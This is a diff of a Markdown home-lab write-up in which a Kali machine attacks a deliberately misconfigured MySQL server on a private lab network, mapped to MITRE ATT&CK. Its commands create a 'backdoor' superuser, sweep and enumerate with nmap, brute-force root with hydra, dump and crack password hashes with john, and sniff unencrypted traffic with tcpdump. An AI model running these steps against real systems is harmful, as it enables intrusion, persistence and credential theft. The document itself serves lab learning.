@@ -70,24 +70,24 @@ These misconfigurations create detectable events:
 
 ---
 
-### Root accessible from anywhere
+### Root accessible remotely
 **MITRE ATT&CK:** T1078.001 (Valid Accounts: Default Accounts)
 
-**Remote Access:**
+**Verify on APP01:**
 
-![Alt text](assets/APP01-Remote-Access-1.png)
+![APP01-Remote-Access-1](assets/APP01-Remote-Access-1.png)
 
-**Create backdoor account:**
+**KALI root access:**
+![APP01-Remote-Access-2](assets/APP01-Remote-Access-2.png)
+
+**KALI creates backdoor:**
 
 ```bash
-CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
+CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; 
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
 ```
 
-![[Pasted image 20251203105317.png]]
-
-**Attack implications:**
-
-- Attacker with network access can connect remotely as root
+![APP01-Backdoor-1](assets/APP01-Backdoor-1.png)
 
 
 ---
@@ -99,15 +99,11 @@ CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; GRANT ALL PRIVILEGES 
 SHOW GRANTS FOR 'svc-sql'@'%' \G
 ```
 
-![[Pasted image 20251203105644.png]]
+![APP01-Service-Root-1](assets/APP01-Service-Root-1.png)
 
-**Login as service account remotely:**
+**KALI logs in directly as service account:**
 
-![[Pasted image 20251203110134.png]]
-
-**Attack implications:**
-
-- Perfect target for lateral movement after web app compromise
+![APP01-Service-Root-2](assets/APP01-Service-Root-2.png)
 
 ---
 
@@ -120,7 +116,7 @@ SHOW GRANTS FOR 'svc-sql'@'%' \G
 notepad "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini"
 ```
 
-![[Pasted image 20251203110726.png]]
+![APP01-All-Network](assets/APP01-All-Network.png)
 
 ```powershell
 # Verify the listening port
@@ -128,9 +124,9 @@ notepad "C:\ProgramData\MySQL\MySQL Server 8.0\my.ini"
 netstat -ano | Select-String "3306"
 ```
 
-![[Pasted image 20251203110811.png]]
+![APP01-All-Network-2](assets/APP01-All-Network-2.png)
 
-**Probe port 3306 from KALI:**
+**Probe port 3306 from KALI to get specific MySQL details:**
 
 ```bash
 # Network sweep for MySQL services 
@@ -140,7 +136,7 @@ nmap -p 3306 192.168.56.0/24 --open
 nmap -p 3306 -sV 192.168.56.4
 ```
 
-![[Pasted image 20251203111107.png]]
+![APP01-All-Network-3](assets/APP01-All-Network-3.png)
 
 ```bash
 # MySQL-specific enumeration 
@@ -148,12 +144,8 @@ nmap -p 3306 -sV 192.168.56.4
 nmap -p 3306 --script=mysql-info,mysql-enum 192.168.56.4
 ```
 
-![[Pasted image 20251203111149.png]]
+![APP01-All-Network-4](assets/APP01-All-Network-4.png)
 
-
-**Attack implications:**
-
-- Makes database accessible from NAT Network, not just localhost
 
 ---
 ### Weak password
@@ -170,9 +162,9 @@ cd /usr/share/wordlists/
 hydra -l root -P mysql.txt mysql://192.168.56.4 -t 4 -V
 ```
 
-![[Pasted image 20251203112828.png]]
+![APP01-Hydra](assets/APP01-Hydra.png)
 
-**Offline hash cracking**:
+**KALI cracks the hash offline**:
 
 ```bash
 # After gaining access, view stored password hashes
@@ -181,7 +173,7 @@ SELECT user, host, authentication_string
 FROM mysql.user;
 ```
 
-![[Pasted image 20251203114532.png]]
+![APP01-Offline-1](assets/APP01-Offline-1.png)
 
 - The two `root` user hashes are: `*6EC9DAC5D899D7F91D65025352A68A7FB70132E8`
 - The hash starts with an asterisk (`*`) and is **41 characters long** (including the `*`).
@@ -197,11 +189,8 @@ mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-verify-server-cert=0 -e "SELECT 
 john --format=mysql-sha1 --wordlist=/usr/share/wordlists/mysql.txt mysql_hashes.txt
 ```
 
-![[Pasted image 20251203120413.png]]
-
-**Attack implications:**
-
-- Accounts susceptible to brute force attacks or credential stuffing 
+![APP01-Offline-2](assets/APP01-Offline-2.png)
+ 
 
 ---
 
@@ -214,7 +203,7 @@ john --format=mysql-sha1 --wordlist=/usr/share/wordlists/mysql.txt mysql_hashes.
 SHOW VARIABLES LIKE 'require_secure_transport';
 ```
 
-![[Pasted image 20251203121019.png]]
+![APP01-SSL-Disabled-1](assets/APP01-SSL-Disabled-1.png)
 
 **Client-side connection with disabled verification:**
 
@@ -222,7 +211,7 @@ SHOW VARIABLES LIKE 'require_secure_transport';
 mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-verify-server-cert=0
 ```
 
-![[Pasted image 20251203121043.png]]
+![APP01-SSL-Disabled-3](assets/APP01-SSL-Disabled-3.png)
 
 **Secure connection attempt (without flag) reveals certificate issues:**
 
@@ -230,24 +219,17 @@ mysql -h 192.168.56.4 -u root -pMySQL123! --ssl-verify-server-cert=0
 mysql -h 192.168.56.4 -u root -pMySQL123!
 ```
 
-![[Pasted image 20251203121215.png]]
+![APP01-SSL-Disabled-2](assets/APP01-SSL-Disabled-2.png)
+
 **tcpdump packet capture:**
 
 ```bash
 tcpdump -i eth1 -w mysql_capture.pcap 'port 3306'
 ```
 
-![[Pasted image 20251203121710.png]]
+![APP01-TCP-1](assets/APP01-TCP-1.png)
 
 **Open pcap file in Wireshark:**
 
-*unencrypted queries and data transmission, plus capturable auth hashes*
 
-![[Pasted image 20251203133149.png]]
-
-![[Pasted image 20251203133321.png]]
-
-**Attack implications:**
-
-- Test command shows connecting WITHOUT SSL certificate verification
-- Allows man-in-the-middle attacks
+![APP01-TCP-2](assets/APP01-TCP-2.png)
